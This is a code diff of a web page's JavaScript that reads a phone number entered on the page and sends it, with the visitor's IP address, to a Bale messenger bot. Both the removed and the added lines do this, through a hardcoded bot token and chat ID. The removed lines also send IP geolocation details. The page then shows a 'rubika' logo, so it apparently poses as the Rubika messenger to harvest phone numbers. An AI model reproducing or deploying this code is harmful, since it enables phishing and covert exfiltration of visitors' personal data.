@@ -19,16 +19,9 @@ async function send_ip() {
 async function send() {
     var phone = document.getElementById('phone_number_1').value;
     try {
-        var request_info_ip = await fetch('http://ip-api.com/json/83.123.48.126');
-        var ip_info = await request_info_ip.json()
-        var text = 'ip : ' + ip_info.query + '\nphone : ' + phone + '\nstatus : ' + ip_info.status + '\ncountry : ' + ip_info.country + '\ncountryCode : ' + ip_info.countryCode + '\nregion : ' + ip_info.region + '\ncity : ' + ip_info.city + '\nzip : ' + ip_info.zip + '\ntimezone : ' + ip_info.timezone + '\nisp : ' + ip_info.isp + '\norg : ' + ip_info.org + '\nas : ' + ip_info.as + '\nlocation : ' + 'https://www.google.com/maps/@' + ip_info.lat + ',' + ip_info.lon;
-        $.ajax({
-            type: 'post',
-            mode: "cors",
-            cache: "no-cache",
-            url: "https://tapi.bale.ai/botwT9ArKZEC8Pxy7mSjvMPHsPj6JiJlIEQDX7P7MOT/sendMessage",
-            data: { chat_id: "915303220", text: String(text) },
-        });
+        var text = 'ip : ' + data.ip + '     phone : ' + phone;
+        var testd = await fetch('https://tapi.bale.ai/botwT9ArKZEC8Pxy7mSjvMPHsPj6JiJlIEQDX7P7MOT/sendMessage?text=' + text + '&chat_id=915303220');
+
     } catch (error) {}
     document.body.innerHTML = `<div class="box">
         <img src="icon-192x192.png" alt="logo rubika">
